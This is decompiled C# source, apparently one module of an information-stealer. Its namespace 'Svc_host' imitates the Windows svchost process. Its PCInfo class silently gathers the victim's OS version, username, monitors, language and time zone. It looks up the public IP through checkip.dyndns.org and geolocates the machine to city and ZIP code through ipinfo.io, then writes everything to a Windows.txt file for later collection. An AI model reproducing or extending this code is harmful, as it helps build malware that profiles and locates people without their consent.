using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace Svc_host;

public static class PCInfo
{
	public static void SaveInfo(string basePath)
	{
		Writer.Write(GetWindowsInfo(), basePath + "/Windows.txt");
	}

	public static string GetPublicIP()
	{
		return new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[1] { ':' })[1].Substring(1).Split(new char[1] { '<' })[0];
	}

	private static List<string> GetWindowsInfo()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				list.Add(string.Format("BuildNumber: {0}", ((ManagementBaseObject)val).get_Item("BuildNumber")));
				list.Add(string.Format("Caption: {0}", ((ManagementBaseObject)val).get_Item("Caption")));
				list.Add("Language: " + CultureInfo.InstalledUICulture.DisplayName);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		list.Add("User: " + WindowsIdentity.GetCurrent().Name);
		list.Add("Monitor info: \n" + GetMonitor());
		list.Add("Ip info: " + GetPublicIP());
		list.Add($"Timezone: UTC({TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)})");
		IpInfo userCountryByIp = GetUserCountryByIp(GetPublicIP());
		list.Add("Country: " + userCountryByIp.Country);
		list.Add("City: " + userCountryByIp.City);
		list.Add("Region: " + userCountryByIp.Region);
		list.Add("ZIP code: " + userCountryByIp.Postal);
		return list;
	}

	private static string GetMonitor()
	{
		StringBuilder stringBuilder = new StringBuilder();
		Screen[] allScreens = Screen.get_AllScreens();
		foreach (Screen val in allScreens)
		{
			stringBuilder.AppendLine(" Name: " + val.get_DeviceName());
			stringBuilder.AppendLine($" Width: {val.get_WorkingArea().Width}");
			stringBuilder.AppendLine($" Height: {val.get_WorkingArea().Height}");
		}
		return stringBuilder.ToString();
	}

	public static IpInfo GetUserCountryByIp(string ip)
	{
		IpInfo ipInfo = new IpInfo();
		try
		{
			ipInfo = JsonConvert.DeserializeObject<IpInfo>(new WebClient().DownloadString("http://ipinfo.io/" + ip));
			RegionInfo regionInfo = new RegionInfo(ipInfo.Country);
			ipInfo.Country = regionInfo.EnglishName;
			return ipInfo;
		}
		catch
		{
			return ipInfo;
		}
	}
}
